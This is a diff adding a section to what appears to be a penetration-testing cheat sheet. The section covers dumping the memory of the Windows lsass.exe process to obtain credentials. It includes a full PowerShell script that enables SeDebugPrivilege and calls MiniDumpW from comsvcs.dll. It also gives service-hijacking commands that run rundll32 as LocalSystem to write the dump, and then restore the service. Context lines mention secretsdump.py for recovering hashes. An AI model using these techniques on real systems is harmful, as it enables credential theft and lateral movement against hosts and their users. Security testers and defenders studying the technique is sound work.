@@ -1232,3 +1232,81 @@ Execute the exported function on the target host.<br />
 
 On Linux, recover the hashes from the exported files.<br />
 `secretsdump.py -system system -sam sam -security security LOCAL`
+
+## >> Dumping lsass.exe using Windows comsvcs.dll
+
+**Powershell method**
+
+Assumes administrator, will acquire SeDebugPrivilege right.<br />
+```powershell
+$DumpFile = "C:\WINDOWS\Temp\lsass.dmp"
+$ProcessId = $pid
+
+$definition = @'
+using System;
+using System.Runtime.InteropServices;
+public class AdjPriv
+{
+  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
+  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
+  [DllImport("advapi32.dll", SetLastError = true)] internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+  [StructLayout(LayoutKind.Sequential, Pack = 1)] internal struct TokPriv1Luid
+  {
+    public int Count;
+    public long Luid;
+    public int Attr;
+  }
+  internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
+  internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
+  internal const int TOKEN_QUERY = 0x00000008;
+  internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
+  public static bool EnablePrivilege(long processHandle, string privilege, bool disable)
+  {
+    bool retVal;
+    TokPriv1Luid tp;
+    IntPtr hproc = new IntPtr(processHandle);
+    IntPtr htok = IntPtr.Zero;
+    retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
+    tp.Count = 1;
+    tp.Luid = 0;
+    if(disable)
+    {
+      tp.Attr = SE_PRIVILEGE_DISABLED;
+    }
+    else
+    {
+      tp.Attr = SE_PRIVILEGE_ENABLED;
+    }
+    retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
+    retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+    return retVal;
+  }
+}
+'@
+$processHandle = (Get-Process -id $ProcessId).Handle
+[bool] $Disable = $false
+$type = Add-Type $definition -PassThru
+$type[0]::EnablePrivilege($processHandle, "SeDebugPrivilege", $Disable)
+$lsass = Get-Process -Name lsass
+$sig = @'
+[DllImport("comsvcs.dll", EntryPoint = "MiniDumpW", CharSet = CharSet.Unicode)]
+public static extern void MiniDumpW(string ignored1, string ignored2, string pid_path_mode);
+'@
+$dmp = Add-Type -memberDefinition $sig -name "MiniDump" -namespace Win32Functions -passThru
+$parameters = $lsass.Id.ToString() + " " + $DumpFile + " full"
+$dmp::MiniDumpW(0, 0, $parameters)
+```
+
+**Using rundll32.exe**
+
+Identify an unused service that runs as LocalSystem and reconfigure the binpath.  This example assumes the PID for lsass.exe is 432.<br />
+```
+sc config ImapiService binPath= "C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 432 C:\Windows\temp\lsass.dmp full" start= demand
+```
+
+Start the service.  It will error but check for output in C:\Windows\temp\lsass.dmp.
+
+Restore the configuration of the unused service.<br />
+```
+sc config ImapiService binPath= "C:\WINDOWS\system32\imapi.exe" start= disabled
+```
